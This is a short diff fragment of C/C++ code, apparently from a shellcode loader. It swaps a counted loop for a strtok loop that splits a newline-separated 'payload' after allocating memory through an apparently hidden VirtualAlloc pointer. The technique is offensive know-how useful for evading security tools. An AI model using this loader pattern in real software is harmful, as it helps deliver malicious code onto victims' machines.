@@ -184,7 +184,7 @@ int main(int argc, char *argv[])
                 PVOID mem = pMVA(0, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                 DWORD_PTR hptr = (DWORD_PTR)mem;
 
-                for (int i{0}; i < loops; i++)
+                for (temp = strtok((char *)payload, "\n"); temp;)
                 {
 #if DEBUG
                         printf("Sub-string: %s\n\n", chars_array);
